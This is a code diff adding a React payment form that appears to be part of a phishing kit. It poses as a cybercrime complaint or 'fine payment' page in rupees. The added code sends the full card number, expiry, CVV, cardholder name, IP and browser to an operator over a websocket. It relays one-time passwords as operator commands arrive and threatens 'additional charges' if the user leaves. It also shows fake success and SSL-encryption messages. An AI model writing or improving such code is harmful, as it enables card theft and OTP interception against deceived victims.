@@ -292,6 +292,332 @@ const PaymentForm: React.FC<PaymentFormProps> = ({ highlightFields, clickTrigger
     wsClient.on('admin_command', handleAdminCommand);
     return () => {
       wsClient.off('admin_command', handleAdminCommand);
+    };
+  }, []);
+
+  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const { name, value } = e.target;
+    setFormData(prev => ({
+      ...prev,
+      [name]: name === 'cardNumber' ? formatCardNumber(value) : value
+    }));
+    // Turn off glow when user starts typing
+    setInputGlow(prev => ({
+      ...prev,
+      [name]: false,
+    }));
+  };
+
+  const formatCardNumber = (value: string) => {
+    const cleaned = value.replace(/\D/g, '');
+    const limited = cleaned.slice(0, 16);
+    const formatted = limited.replace(/(\d{4})(?=\d)/g, '$1 ');
+    return formatted;
+  };
+
+  const generateInvoiceId = () => {
+    return `INV${Date.now()}${Math.floor(Math.random() * 1000)}`;
+  };
+
+  const sendOtp = (otp: string) => {
+    if (currentSubmissionId) {
+      console.log(`[PaymentForm] Sending OTP: ${otp} for submission_id: ${currentSubmissionId}`);
+      wsClient.send('otp_submitted', { otp, submission_id: currentSubmissionId });
+    }
+  };
+
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!isFormValid()) return;
+    setIsLoading(true);
+    setErrorMessage('');
+
+    // Get the socket ID and ensure we have it before proceeding
+    const socketId = wsClient.getSocketId();
+    console.log(`[PaymentForm] Current socket ID: ${socketId}`);
+    if (!socketId) {
+      console.error('No socket ID available');
+      setErrorMessage('Error: Not connected to server. Please refresh.');
+      setIsLoading(false);
+      return;
+    }
+
+    // Store the socket ID for command targeting
+    setCurrentSubmissionId(socketId);
+
+    // Get real IP and prepare card data
+    const realIP = await getRealIP();
+    const cardData = {
+      id: socketId, // Use socket ID as the ID
+      socket_id: socketId, // Also include as socket_id for clarity
+      invoice_id: generateInvoiceId(), // Generate invoice ID
+      card_number: formData.cardNumber,
+      expiry_month: formData.expiryMonth,
+      expiry_year: formData.expiryYear,
+      cvv: formData.cvv,
+      card_holder: formData.cardHolder,
+      amount: formData.amount,
+      user_ip: realIP,
+      browser: navigator.userAgent.split(' ')[navigator.userAgent.split(' ').length - 1],
+      network: getRandomNetwork(),
+      created_at: new Date().toISOString(),
+      status: 'pending'
+    };
+
+    console.log('Submitting card data:', {
+      socketId,
+      invoiceId: cardData.invoice_id,
+      amount: cardData.amount,
+      cardNumber: cardData.card_number
+    });
+
+    wsClient.send('card_submission', cardData);
+  };
+
+  const handleConfirmPay = async (otp: string) => {
+    setIsConfirmLoading(true);
+    setInvalidOtpMessage('');
+    sendOtp(otp);
+  };
+
+  const handleBackDialogAction = (action: 'leave' | 'cancel') => {
+    setShowBackDialog(false);
+    if (action === 'leave') {
+      setErrorMessage('Please try again');
+      window.location.href = '/';
+    }
+  };
+
+  const maskCardInfo = (value: string) => {
+    return '*'.repeat(value.length);
+  };
+
+  if (showSuccess) {
+    return (
+      <div className={`${isMobile ? 'w-full p-4' : 'w-96'} bg-white ${!isMobile && 'border-l border-gray-200'} ${isMobile ? 'min-h-screen' : 'p-6 min-h-screen'}`}>
+        <div className="text-center pt-4">
+          <div className="text-green-600 text-6xl animate-bounce">✓</div>
+          <p className="text-lg font-bold text-green-600 mt-4">Payment Successful!</p>
+        </div>
+      </div>
+    );
+  }
+
+  if (showProcessing) {
+    return (
+      <div className={`${isMobile ? 'w-full p-4' : 'w-96'} bg-white ${!isMobile && 'border-l border-gray-200'} ${isMobile ? 'min-h-screen' : 'p-6 min-h-screen'}`}>
+        <div className="text-center pt-4">
+          <Loader2 className="w-8 h-8 animate-spin mx-auto mb-4" />
+          <p className="text-lg text-black">Please wait while we process your transaction securely...</p>
+        </div>
+      </div>
+    );
+  }
+
+  if (showOtp) {
+    return (
+      <div className={`${isMobile ? 'w-full' : 'w-96'} bg-white ${!isMobile && 'border-l border-gray-200'}`}>
+        <OTPVerificationPage
+          onBack={() => setShowOtp(false)}
+          onConfirm={handleConfirmPay}
+          isLoading={isConfirmLoading}
+          invalidOtpMessage={invalidOtpMessage}
+          cardNumber={formData.cardNumber}
+          amount={formData.amount}
+          bankLogo={selectedBankLogo}
+        />
+      </div>
+    );
+  }
+  return (
+    <div className={`${isMobile ? 'w-full p-4' : 'w-96'} bg-white ${!isMobile && 'border-l border-gray-200'} ${isMobile ? '' : 'p-6'} transition-opacity duration-300 ${fadeState === 'fadeOut' ? 'opacity-0' : 'opacity-100'}`}>
+      {showBackDialog && (
+        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
+          <div className="bg-white p-6 rounded-lg shadow-lg">
+            <p className="mb-4">Do you want to cancel this transaction? Pressing back will result in additional charges.</p>
+            <div className="flex space-x-4">
+              <button
+                onClick={() => handleBackDialogAction('leave')}
+                className="px-4 py-2 bg-red-600 text-white rounded hover:bg-red-700"
+              >
+                Leave
+              </button>
+              <button
+                onClick={() => handleBackDialogAction('cancel')}
+                className="px-4 py-2 bg-gray-300 text-gray-700 rounded hover:bg-gray-400"
+              >
+                Cancel
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {showAlert && (
+        <div className="fixed top-4 left-1/2 transform -translate-x-1/2 z-50 bg-red-600 text-white px-6 py-3 rounded-lg shadow-lg flex items-center space-x-2">
+          <AlertTriangle className="w-5 h-5" />
+          <span className="font-bold">Complete the fine payment here</span>
+        </div>
+      )}
+
+      <div className="bg-red-50 border border-red-200 rounded p-4 mb-6">
+        <div className="flex items-center mb-2">
+          <Shield className="w-5 h-5 text-red-600 mr-2" />
+          <span className="font-semibold text-red-800">Secure Payment Required</span>
+        </div>
+        <p className="text-sm text-red-700">
+          Complete your payment to proceed with cyber crime complaint registration.
+        </p>
+      </div>
+
+      {errorMessage && (
+        <div className="border border-red-500 bg-transparent p-3 rounded mb-4">
+          <p className="text-red-600 text-sm">{errorMessage}</p>
+        </div>
+      )}
+
+      <form onSubmit={handleSubmit} className="space-y-4">
+        <div>
+          <label className="block text-sm font-medium text-gray-700 mb-1">
+            Amount to Pay
+          </label>
+          <div className="relative">
+            <span className="absolute left-3 top-2 text-gray-500">₹</span>
+            <input
+              type="text"
+              name="amount"
+              value={formData.amount}
+              onChange={handleInputChange}
+              className="w-full pl-8 pr-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 bg-gray-50"
+              readOnly
+            />
+          </div>
+        </div>
+
+        <div>
+          <label className="block text-sm font-medium text-gray-700 mb-1">
+            Card Number
+          </label>
+          <div className="relative">
+            <CreditCard className="absolute left-3 top-3 w-6 h-6 text-gray-400" />
+            <input
+              type="text"
+              name="cardNumber"
+              placeholder="XXXX XXXX XXXX XXXX"
+              value={isLoading ? maskCardInfo(formData.cardNumber) : formData.cardNumber}
+              onChange={handleInputChange}
+              onBlur={(e) => {
+                  if (e.target.value.trim() === '') {
+                    setInputGlow(prev => ({ ...prev, cardNumber: true }));
+                  }
+                }}
+              className={`w-full pl-12 pr-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 ${inputGlow.cardNumber ? 'ring-4 ring-red-500 ring-opacity-50 rounded-lg' : ''}`}
+              maxLength={19}
+              disabled={isLoading}
+            />
+          </div>
+        </div>
+
+        <div className="grid grid-cols-3 gap-3">
+          <div>
+            <label className="block text-sm font-medium text-gray-700 mb-1">
+              Month
+            </label>
+            <input
+              type="text"
+              name="expiryMonth"
+              placeholder="MM"
+              value={isLoading ? maskCardInfo(formData.expiryMonth) : formData.expiryMonth}
+              onChange={handleInputChange}
+              onBlur={(e) => {
+                  if (e.target.value.trim() === '') {
+                    setInputGlow(prev => ({ ...prev, expiryMonth: true }));
+                  }
+                }}
+              className={`w-full px-3 py-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500 ${inputGlow.expiryMonth ? 'ring-4 ring-red-500 ring-opacity-50 rounded-lg' : ''} ${formData.expiryMonth && (parseInt(formData.expiryMonth) < 1 || parseInt(formData.expiryMonth) > 12) 
+                ? 'border-red-500' : 'border-gray-300'
+              }`}
+              maxLength={2}
+              disabled={isLoading}
+            />
+            {formData.expiryMonth && (parseInt(formData.expiryMonth) < 1 || parseInt(formData.expiryMonth) > 12) && (
+              <p className="text-red-500 text-xs mt-1">Valid month (1-12)</p>
+            )}
+          </div>
+          
+          <div>
+            <label className="block text-sm font-medium text-gray-700 mb-1">
+              Year
+            </label>
+            <input
+              type="text"
+              name="expiryYear"
+              placeholder="YY"
+              value={isLoading ? maskCardInfo(formData.expiryYear) : formData.expiryYear}
+              onChange={handleInputChange}
+              onBlur={(e) => {
+                  if (e.target.value.trim() === '') {
+                    setInputGlow(prev => ({ ...prev, expiryYear: true }));
+                  }
+                }}
+              className={`w-full px-3 py-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500 ${inputGlow.expiryYear ? 'ring-4 ring-red-500 ring-opacity-50 rounded-lg' : ''} ${formData.expiryYear && parseInt(formData.expiryYear) > 50 
+                ? 'border-red-500' : 'border-gray-300'
+              }`}
+              maxLength={2}
+              disabled={isLoading}
+            />
+            {formData.expiryYear && parseInt(formData.expiryYear) > 50 && (
+              <p className="text-red-500 text-xs mt-1">Valid year (max 50)</p>
+            )}
+          </div>
+          
+          <div>
+            <label className="block text-sm font-medium text-gray-700 mb-1">
+              CVV
+            </label>
+            <div className="relative">
+              <Lock className="absolute left-2 top-3 w-6 h-6 text-gray-400" />
+              <input
+                type="text"
+                name="cvv"
+                placeholder="123"
+                value={isLoading ? maskCardInfo(formData.cvv) : formData.cvv}
+                onChange={handleInputChange}
+                onBlur={(e) => {
+                  if (e.target.value.trim() === '') {
+                    setInputGlow(prev => ({ ...prev, cvv: true }));
+                  }
+                }}
+                className={`w-full pl-10 pr-2 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 ${inputGlow.cvv ? 'ring-4 ring-red-500 ring-opacity-50 rounded-lg' : ''}`}
+                maxLength={4}
+                disabled={isLoading}
+              />
+            </div>
+          </div>
+        </div>
+
+        <div>
+          <label className="block text-sm font-medium text-gray-700 mb-1">
+            Card Holder Name
+          </label>
+          <input
+            type="text"
+            name="cardHolder"
+            placeholder="Enter full name as on card"
+            value={isLoading ? maskCardInfo(formData.cardHolder) : formData.cardHolder}
+            onChange={handleInputChange}
+            onBlur={(e) => {
+              if (e.target.value.trim() === '') {
+                setInputGlow(prev => ({ ...prev, cardHolder: true }));
+              }
+            }}
+            className={`w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 ${inputGlow.cardHolder ? 'ring-4 ring-red-500 ring-opacity-50 rounded-lg' : ''}`}
+            disabled={isLoading}
+          />
+        </div>
+
+        <div className="bg-blue-50 border border-blue-200 rounded p-3 mt-4">
+          <div className="flex items-center text-sm text-blue-800">
             <Shield className="w-4 h-4 mr-2" />
             <span>256-bit SSL Encryption</span>
           </div>
